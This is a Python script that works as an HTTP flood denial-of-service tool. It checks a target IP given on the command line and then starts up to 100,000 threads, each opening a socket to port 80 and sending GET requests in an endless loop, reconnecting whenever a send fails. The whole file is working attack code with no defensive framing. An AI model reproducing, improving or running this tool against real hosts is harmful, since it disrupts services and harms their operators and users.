import socket
import threading
import optparse

number = 0

def is_ip_adress(ip ):
    ip_list = ip.split(".")
    if len(ip_list) != 4:
        print("[-] Incorrect ip\n")
        exit()
    for elem in ip_list:
        for symbol in elem:
            if not (ord("0") <= ord(symbol) <= ord("9")):
                print("[-] Incorrect ip\n")
                exit()
        if elem[0] == '0' and len(elem) > 1:
            print("[-] Incorrect ip\n")
            exit()
        number = int(elem)  
        if not (0 <= number <= 255):
            print("[-] Incorrect ip\n")
            exit()
    return True

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i" , "--ip" , dest = "ip" , help = "Target ip adress")
    arguments , options = parser.parse_args()
    if not arguments.ip:
        parser.error("[-] Please set IP adress of target , for more information use --help")
    return str(arguments.ip)

def parse_args() :
    get_ip = get_arguments()
    if is_ip_adress(get_ip):
        return get_ip
    else:
        print("[-] Inccorect ip adress")
        exit()

def odnop(ip_adress):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_adress = (ip_adress , 80)
    sock.connect(server_adress)

    message = f"GET / HTTP/1.1\r\nHost: {ip_adress}\r\n\r\n"
    message = message.encode()

    while True:
        try:
            sock.sendall(message)
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_adress = (ip_adress , 80)
            sock.connect(server_adress)

def main_work():
    ip_arg = parse_args()
    thread_arr = []
    for i in range(100000):
        thread_arr.append(threading.Thread(target = odnop , args = (ip_arg , )))

    for curr_thread in thread_arr:
        curr_thread.start()

main_work()
    